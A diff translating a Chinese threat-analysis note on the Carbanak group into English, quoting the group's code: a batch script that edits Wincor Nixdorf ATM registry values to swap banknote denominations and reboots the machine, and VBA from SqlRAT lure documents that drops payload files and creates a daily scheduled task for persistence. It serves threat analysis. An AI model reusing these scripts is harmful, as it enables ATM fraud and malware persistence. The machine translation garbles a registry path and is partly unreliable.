@@ -1,8 +1,8 @@
 # Carbanak
 
-## 特征
+## Features
 
-1. 该组织在拥有ATM机的权限时会下载恶意脚本1.bat，下载完毕后会立即执行该脚本更改ATM机的注册表中的纸币面值，比如攻击者收到10张面额100卢布的钞票，但是实际上是5000面额的钞票.
+1. The organization will download the malicious script 1.bat when it has the authority of the ATM machine. After downloading, it will immediately execute the script to change the face value of the note in the registry of the ATM machine. For example, the attacker receives 10 banknotes with a face value of 100 rubles, but in fact it is a banknote with a face value of 5000 rubles.
 
 ```bash
 REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER” /v VALUE_1 /t REG_SZ
@@ -20,9 +20,9 @@ REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LY
 shutdown -r -t 0 –f
 ```
 
-该脚本会修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_DISPENSER的VALUE_1的值为100，并且修改VALUE_4的值为5000，然后重启计算机，待重启后，吐出1号的纸币的面额将会更改为5000而不是100.
+This script modifies the registry HKEY_ LOCAL_ MACHINE\SOFTWARE\Wincor Nixdorf\ProTopas\CurrentVersion\LYNXPAR\CASH_ VALUE of DISPENSER_ The value of 1 is 100, and  modified the VALUE_4 is 5000, and then restart the computer. After the restart, the denomination of the 1 note will be changed to 5000 instead of 100.
 
-2. 使用SqlRAT工具创建恶意文档时会包含图像诱使受害者双击图像以便启动VBA，其代码进行了加密，可以通过16进制编辑器打开并搜索密码位置将DPb标识替换为DPx标识即可绕过.在该VBA代码中会声明三个文件的名称用来写入保存稍后的Payload.
+2. When creating a malicious document using SqlRAT tool, it will contain an image to induce the victim to double-click the image to start VBA. Its code is encrypted. You can open it through a hexadecimal editor and search the password location to replace the DPb ID with the DPx ID to bypass it. The VBA code will declare the names of three files to write to the saved Payload later.
 
 ```vba
 Private Sub StartUnlock()
@@ -54,7 +54,7 @@ Private Sub StartUnlock()
       End lf
 ```
 
-然后声明三个变量为创建的三个空文件写入内容.
+Then declare three variables to write content for the three empty files created.
 
 ```VBA
 sc1 = ""
@@ -77,22 +77,22 @@ For Each shd In shds
       End If
 ```
 
-写入的文件会存储到%APPDATA%\Microsoft\Templates目录下，然后会创建计划任务来保持其持久性.
+The written file will be stored in the% APPDATA%\Microsoft\Templates directory, and then a scheduled task will be created to maintain its persistence.
 
 ```VBA
 Private Sub b14(lparam, rparam, Descr)
 Set service =CreateObject ("Schedule.Service")
 Call service.Connect
 Dim rootFolder, lFld
-//定义文件夹对象
+//Define folder objects
 Set rootFolder = service.GetFolder("\")
-//获取已注册任务文件夹
+//Get registered task folder
 Set nFolder = rootFolder
 Dim taskDefinition
-//定义任务所有的脚本对象
+//Define all script objects of the task
 Set taskDefinition = service.NewTask(0)
 Dim regInfo
-//定义任务注册信息
+//Define task registration information
 Set regInfo = taskDefinition.RegistrationInfo
 regInfo. Description = Descr
 regInfo.Author = "system"
@@ -102,12 +102,12 @@ settings.Enabled = True
 settings.StartWhenAvailable = True
 settings.Hidden = False
 Dim triggers
-//定义触发器
+//Define trigger
 Set triggers = taskDefinition.triggers
 Dim trigger
 Set trigger = triggers.Create(2)
 Dim startTime, endTime
-//定义激活触发器的时间
+//Define when the trigger is activated
 Dim time
 time = #1/2/2018 9:00:00 AM#
 startTime = XmlTime (time)
@@ -116,18 +116,18 @@ endTime = XmlTime ( time)
 
 trigger.StartBoundary = startTime
 trigger.EndBoundary = endTime
-trigger. DaysInterval = 1  //每天都运行该计划任务
+trigger. DaysInterval = 1  //Run the scheduled task every day
 trigger.ID = "DailyTriggerId"
 trigger.Enabled = True
 If (lparam = "init.dot") Then
 trigger.RandomDelay = "PT2M"
 Else
 trigger.RandomDelay = "PT3M"
-//设置任务重复次数
+//Set task repetition times
 End lf
 ```
 
-3. 通过Windows工具wscript.exe调用JavaScript启动恶意软件.
+3. Launch malware by calling JavaScript through Windows tool wscript.exe.
 
 ```vba
 Dim Action
